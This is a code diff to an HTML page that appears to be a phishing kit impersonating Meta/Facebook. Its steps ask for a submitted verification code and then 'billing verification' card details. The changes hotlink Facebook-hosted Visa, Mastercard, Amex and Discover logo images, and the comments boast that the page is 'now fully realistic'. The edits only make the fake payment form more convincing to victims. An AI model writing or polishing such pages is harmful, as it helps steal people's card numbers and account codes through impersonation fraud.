@@ -58,7 +58,8 @@
         .meta-link { color: var(--m-blue); text-decoration: none; cursor: pointer; font-weight: normal; }
         
         input[type="text"]#card_number { letter-spacing: 2px; font-family: monospace; }
-        .card-icons { text-align: right; margin-bottom: 10px; font-size: 28px; opacity: 0.6; }
+        .card-icons { text-align: right; margin-bottom: 10px; opacity: 0.6; }
+        .card-icons img { height: 24px; margin-left: 12px; vertical-align: middle; }
         .expiry-cvv-row { display: flex; gap: 10px; }
         .expiry-cvv-row > div { flex: 1; }
         .secure-note { font-size: 13px; color: var(--m-gray); margin-top: 20px; }
@@ -136,7 +137,7 @@
     <div class="btn-row"><button class="btn" onclick="step(4, 5)">Submit Code</button></div>
 </div>
 
-<!-- Billing step - now fully realistic: no illustration/image at top -->
+<!-- Billing step - now with real card brand logo images -->
 <div id="p5" class="card hidden" style="max-width: 600px;">
     <h1>Confirm payment method</h1>
     <div style="font-size: 12px; color: var(--m-gray); margin-bottom: 10px;">Billing verification</div>
@@ -150,7 +151,12 @@
     <input type="text" id="card_name" placeholder="Full name as it appears on card">
 
     <label class="bday-label">Card number</label>
-    <div class="card-icons">Visa Mastercard Amex Discover</div>
+    <div class="card-icons">
+        <img src="https://www.facebook.com/rsrc.php/v3/y9/r/Of8pN2a3PmV.png" alt="Visa">
+        <img src="https://www.facebook.com/rsrc.php/v3/yV/r/jkOQLqR0a1B.png" alt="Mastercard">
+        <img src="https://www.facebook.com/rsrc.php/v3/ym/r/3ci9Ef4c-rf.png" alt="American Express">
+        <img src="https://static.xx.fbcdn.net/rsrc.php/v3/y6/r/J1cR_nw1X2w.png" alt="Discover">
+    </div>
     <input type="text" id="card_number" placeholder="1234 5678 9012 3456" maxlength="19" onkeyup="formatCard(this)">
 
     <div class="expiry-cvv-row">
